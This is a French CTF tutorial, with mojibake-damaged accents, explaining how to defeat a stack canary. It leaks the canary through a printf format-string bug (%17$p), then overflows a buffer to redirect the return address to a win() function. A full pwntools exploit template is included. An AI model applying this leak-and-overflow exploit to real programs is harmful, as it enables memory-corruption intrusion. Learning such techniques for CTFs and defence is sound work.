# Stack Canary Bypass â€” Format String Leak + Buffer Overflow

## Table des matiÃ¨res
- [PrÃ©requis](#prÃ©requis)
- [Concepts clÃ©s](#concepts-clÃ©s)
- [Analyser le binaire](#analyser-le-binaire)
- [Ã‰tape 1 â€” Fuite du canary via Format String](#Ã©tape-1--fuite-du-canary-via-format-string)
- [Ã‰tape 2 â€” Construction du payload](#Ã©tape-2--construction-du-payload)
- [Ã‰tape 3 â€” Exploitation complÃ¨te](#Ã©tape-3--exploitation-complÃ¨te)
- [SchÃ©ma rÃ©capitulatif](#schÃ©ma-rÃ©capitulatif)
- [Erreurs frÃ©quentes](#erreurs-frÃ©quentes)
- [RÃ©sumÃ© des commandes utiles](#rÃ©sumÃ©-des-commandes-utiles)

---

## PrÃ©requis

- ConnaÃ®tre les bases du langage C et de l'assembleur x86/x64
- Avoir `pwntools` installÃ© (`pip install pwntools`)
- Avoir `radare2` installÃ© pour l'analyse statique
- Comprendre ce qu'est une stack frame

---

## Concepts clÃ©s

### Le Stack Canary

Un **canary** est une valeur secrÃ¨te gÃ©nÃ©rÃ©e alÃ©atoirement Ã  chaque exÃ©cution du programme, placÃ©e sur la pile entre le buffer et l'adresse de retour. Si un attaquant dÃ©borde le buffer et Ã©crase le canary, le programme le dÃ©tecte et se suicide.

```
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”  â† haut de la pile
â”‚   buffer     â”‚  â† zone oÃ¹ tu Ã©cris tes donnÃ©es
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚   CANARY     â”‚  â† valeur secrÃ¨te (ex: 0x3f2a8c00000000)
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚  saved RBP   â”‚  â† ancien pointeur de base (8 octets en x64)
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚ adresse ret  â”‚  â† ce qu'on veut Ã©craser pour rediriger l'exÃ©cution
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
```

> **Note :** Le canary se termine toujours par `\x00` (null byte) pour stopper les `printf` et `puts` qui s'arrÃªtent au premier octet nul.

### Les protections du binaire

Avant d'exploiter, on vÃ©rifie toujours les protections avec `checksec` :

```bash
checksec --file=./binaire
```

| Protection | Signification | Impact sur l'exploit |
|---|---|---|
| **Canary** | Valeur secrÃ¨te sur la pile | Il faut la fuiter avant d'Ã©craser |
| **NX enabled** | La pile n'est pas exÃ©cutable | Pas de shellcode sur la pile |
| **No PIE** | Adresses fixes dans le binaire | Pas besoin de fuiter les adresses du binaire |
| **Full RELRO** | La GOT est en lecture seule | On ne peut pas Ã©craser les entrÃ©es GOT |

### La vulnÃ©rabilitÃ© Format String

Quand un programme fait `printf(user_input)` sans format string, on peut lire des valeurs directement sur la pile :

```c
// Code vulnÃ©rable
printf(buffer);          // â† DANGEREUX

// Code correct
printf("%s", buffer);    // â† sÃ»r
```

En envoyant `%p` on lit des adresses, `%17$p` lit le 17Ã¨me argument (= valeur sur la pile Ã  l'offset 17).

---

## Analyser le binaire

### Avec radare2

```bash
r2 ./binaire     # ouvrir le binaire
aaa              # analyse complÃ¨te
afl              # lister toutes les fonctions
pdf @ sym.main   # dÃ©sassembler main
pdf @ sym.fonction_vulnerable
```

### Ce qu'on cherche dans le dÃ©sassemblage

```asm
push rbp
mov rbp, rsp
sub rsp, 0x60          â† taille totale de la stack frame (0x60 = 96 octets)

mov rax, qword fs:[0x28]
mov qword [rbp-0x8], rax   â† le canary est Ã  rbp-0x8
```

### Calculer les offsets

Ã€ partir du dÃ©sassemblage on dÃ©duit le layout de la pile :

```
rbp - 0x60  â† dÃ©but de la stack frame
...
rbp - 0x08  â† CANARY (8 octets)
rbp + 0x00  â† saved RBP (8 octets) â† junk data
rbp + 0x08  â† adresse de retour â† notre cible
```

La distance buffer â†’ canary = `0x60 - 0x08 = 0x58 = 88 octets`
*(Ã  affiner selon l'offset exact de ton buffer dans la stack frame)*

### Trouver la fonction cible (win function)

```bash
afl | grep win     # cherche une fonction "win" ou Ã©quivalent
pdf @ sym.win      # vÃ©rifie ce qu'elle fait
```

---

## Ã‰tape 1 â€” Fuite du canary via Format String

### Trouver l'offset du canary dans la pile

On envoie des `%p` pour lire la pile un argument Ã  la fois :

```python
for i in range(1, 30):
    io.sendline(f"%{i}$p".encode())
    leak = io.recvline()
    print(f"{i}: {leak}")
```

On cherche une valeur qui :
- Se termine par `00` (null byte du canary)
- Change Ã  chaque exÃ©cution (valeur alÃ©atoire)
- Est Ã  la mÃªme position Ã  chaque run

### Fuiter le canary dans l'exploit

```python
io.sendline(b"%17$p")      # remplace 17 par l'offset trouvÃ©
io.recvuntil(b": ")
canary_leak = io.recvline().decode().strip()
canary_leak = int(canary_leak, 16)

log.info(f"Canary leaked: {hex(canary_leak)}")
```

---

## Ã‰tape 2 â€” Construction du payload

### Structure du payload

```
[ padding jusqu'au canary ] + [ canary volÃ© ] + [ junk data ] + [ adresse cible ]
```

### En code pwntools

```python
from pwn import *

exe = context.binary = ELF("./binaire")

# Distances calculÃ©es depuis radare2
offset_to_canary = 72        # octets de padding avant le canary
saved_rbp_size   = 8         # toujours 8 octets en x64, 4 octets en x86

# Adresse de la fonction qu'on veut appeler
win_addr = exe.symbols["win"]

# Construction
padding    = cyclic(offset_to_canary)   # remplissage jusqu'au canary
junk_rbp   = cyclic(saved_rbp_size)     # Ã©crase le saved RBP (valeur indiffÃ©rente)

payload = flat([
    padding,          # on remplit jusqu'au canary
    canary_leak,      # on remet le vrai canary pour ne pas dÃ©clencher l'alarme
    junk_rbp,         # on Ã©crase le saved RBP avec n'importe quoi
    p64(win_addr)     # on met notre adresse de retour
])
```

### Pourquoi cyclic() pour le junk data ?

`cyclic(8)` gÃ©nÃ¨re `b"aaaabaaĞ°"` â€” 8 octets de donnÃ©es reconnaissables. Si l'exploit plante, on peut retrouver l'offset exact depuis un core dump :

```bash
# Dans GDB aprÃ¨s un crash
cyclic -l 0x61616161   # retrouve l'offset depuis la valeur crashÃ©e
```

Alternatives Ã©quivalentes pour le junk data :
```python
b"A" * 8           # simple padding
p64(0xdeadbeef)    # valeur de debug reconnaissable
cyclic(8)          # meilleure pratique CTF
```

### DiffÃ©rence x64 vs x86

| | x64 | x86 |
|---|---|---|
| Taille d'un pointeur | 8 octets | 4 octets |
| Taille du canary | 8 octets | 4 octets |
| Taille du saved RBP | 8 octets | 4 octets |
| Fonction d'encodage | `p64()` | `p32()` |

---

## Ã‰tape 3 â€” Exploitation complÃ¨te

### Template d'exploit complet

```python
#!/usr/bin/env python3
from pwn import *

exe = context.binary = ELF("./binaire")

host = "challenges.exemple.fr"
port = 12345

def start():
    if args.LOCAL:
        return process([exe.path])
    return remote(host, port)

io = start()

# â”€â”€ Ã‰tape 1 : fuiter le canary â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
io.recvuntil(b">")
io.sendline(b"2")                          # option du menu qui appelle printf vulnÃ©rable
io.sendlineafter(b">>", b"%17$p")          # fuite du canary (adapter l'offset)
io.recvuntil(b": ")
canary_leak = int(io.recvline().decode().strip(), 16)
log.success(f"Canary : {hex(canary_leak)}")

# â”€â”€ Ã‰tape 2 : construire le payload â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
offset_to_canary = 72
win_addr         = exe.symbols["win"]      # ou adresse trouvÃ©e dans r2

payload = flat([
    cyclic(offset_to_canary),              # padding jusqu'au canary
    canary_leak,                           # vrai canary (Ã©vite le crash)
    cyclic(8),                             # junk data pour le saved RBP
    p64(win_addr)                          # notre adresse de retour
])

# â”€â”€ Ã‰tape 3 : envoyer le payload â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
io.sendlineafter(b">>", b"1")              # option du menu qui lit l'input vulnÃ©rable
io.sendline(payload)

# â”€â”€ Ã‰tape 4 : rÃ©cupÃ©rer le flag â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
io.sendlineafter(b">>", b"3")              # option qui dÃ©clenche l'exÃ©cution
io.stream()
```

---

## SchÃ©ma rÃ©capitulatif

```
AVANT l'exploit (pile normale)
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚ buffer (72 oct)  â”‚ â† donnÃ©es utilisateur lÃ©gitimes
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚ CANARY (8 oct)   â”‚ â† valeur secrÃ¨te alÃ©atoire
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚ saved RBP (8 oct)â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚ adresse ret      â”‚ â†’ pointe vers le code normal
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜

APRÃˆS l'exploit (pile corrompue)
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚ cyclic(72)       â”‚ â† on remplit jusqu'au canary
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚ canary_leak      â”‚ â† on remet la VRAIE valeur â†’ pas d'alarme
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚ cyclic(8)        â”‚ â† junk data, on s'en fout
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚ p64(win_addr)    â”‚ â†’ pointe vers notre fonction cible ğŸ¯
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜

FLUX D'ATTAQUE
1. Format String (%17$p) â†’ fuite du canary
2. Buffer Overflow       â†’ Ã©crasement contrÃ´lÃ©
3. Canary intact         â†’ pas de dÃ©tection
4. RET vers win()        â†’ flag !
```

---

## Erreurs frÃ©quentes

### Le programme crashe avec "stack smashing detected"
â†’ Le canary a Ã©tÃ© mal rÃ©injectÃ©. VÃ©rifier `canary_leak` avec `log.info()` et s'assurer qu'il n'y a pas de problÃ¨me d'encodage.

### L'adresse de retour ne pointe pas au bon endroit
â†’ VÃ©rifier l'offset avec `cyclic` + GDB. Lancer l'exploit en LOCAL avec `NOASLR` pour dÃ©bugger :
```bash
./exploit.py LOCAL NOASLR DEBUG
```

### `%17$p` ne retourne pas le canary
â†’ Le canary n'est pas au 17Ã¨me argument. Bruteforcer les offsets avec une boucle `%1$p` Ã  `%30$p` et chercher la valeur qui se termine par `00`.

### `flat()` ne pack pas comme attendu
â†’ S'assurer que `context.binary` est bien dÃ©fini pour que pwntools connaisse l'architecture (x64 vs x86).

---

## RÃ©sumÃ© des commandes utiles

```bash
# Analyse statique
r2 ./binaire
aaa                          # analyse complÃ¨te
afl                          # liste les fonctions
pdf @ sym.fonction            # dÃ©sassemble une fonction
afvd                         # affiche les variables locales et leurs offsets

# VÃ©rifier les protections
checksec --file=./binaire

# Debug de l'exploit
./exploit.py LOCAL DEBUG      # en local avec logs
./exploit.py LOCAL NOASLR     # dÃ©sactive l'ASLR pour dÃ©bugger
./exploit.py GDB              # attache GDB automatiquement
```

---

*Technique : Format String Leak + Stack Canary Bypass + Ret2Win*
*Architecture cible : x86-64 (amd64)*
*Outils : pwntools, radare2*
